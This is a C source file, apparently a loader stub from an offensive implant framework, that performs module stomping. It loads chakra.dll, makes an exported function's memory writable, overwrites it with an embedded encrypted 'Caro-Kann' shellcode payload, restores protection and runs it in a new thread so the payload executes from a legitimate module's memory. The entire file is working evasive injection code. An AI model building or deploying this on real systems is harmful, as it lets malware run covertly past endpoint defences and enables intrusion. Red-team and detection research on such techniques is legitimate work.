#include <windows.h>
#include "common/tcg.h"

// WinAPI import declarations (resolved by the loader / custom resolver)
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CloseHandle       ( HANDLE );
DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread      ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect    ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$GetModuleHandleA  ( LPCSTR );

void moduleStomp();

// Metadata describing a target function to be overwritten ("stomped") with an in-memory payload.
typedef struct {
    int        Offset;
    PVOID      Func;
    PVOID      Dll;
    PVOID      InjectionAddr;
    int        InjectionLength;
} STOMP_DLL;

// Linker-defined section containing the Caro-Kann shellcode to be injected,
// including the encrypted payload defined by the .spec files
char _carokann_  [ 0 ] __attribute__ ( ( section ( "carokann" ) ) );

// Generic resource container used for embedded blobs (payloads, masks, etc.).
typedef struct {
	int   length;
	char  value [ ];
} _RESOURCE;

/*
 * Entry point for the position-independent stub.
 * Delegates execution to the module stomping routine.
 */
void go() {
    moduleStomp ( );
}

/*
 * Loads a module and overwrites an exported function with a custom
 * payload and executes it in a new thread.
 */
void moduleStomp() {

    STOMP_DLL stomp = { 0 };

    // Resolve embedded Caro-Kann shellcode
    _RESOURCE * carokann  = ( _RESOURCE * ) &_carokann_;
    stomp.InjectionAddr   = carokann->value;
    stomp.InjectionLength = carokann->length;
    
    // Resolve target module (already loaded or loaded on demand)
    stomp.Dll = KERNEL32$GetModuleHandleA ( "chakra.dll" );
    if ( stomp.Dll == NULL ) {
        stomp.Dll = LoadLibraryA ( "chakra.dll" );
    }

    // Resolve target function to overwrite
    stomp.Func = ( PVOID ) GetProcAddress ( ( HMODULE ) stomp.Dll, "MemProtectHeapUnprotectCurrentThread" );

    if ( stomp.Func != NULL ) {

        // Make the target function region writable (page-granular change)
        DWORD orig_protect;
        KERNEL32$VirtualProtect ( stomp.Func, stomp.InjectionLength, PAGE_READWRITE, &orig_protect );

        // Overwrite the function body with the payload bytes
        __movsb ( ( unsigned char * ) stomp.Func, ( unsigned char * ) stomp.InjectionAddr, stomp.InjectionLength );

        /// Restore the original memory protection
        DWORD old_protect;
        KERNEL32$VirtualProtect ( stomp.Func, stomp.InjectionLength, orig_protect, &old_protect );

        // Execute the overwritten function in a new thread
        DWORD tid = 0;
        HANDLE h = KERNEL32$CreateThread ( NULL, 0, stomp.Func, NULL, 0, &tid );

        // Close thread handle to avoid leaking kernel objects
        if (h) {
            KERNEL32$CloseHandle ( h );
        }
    }
}
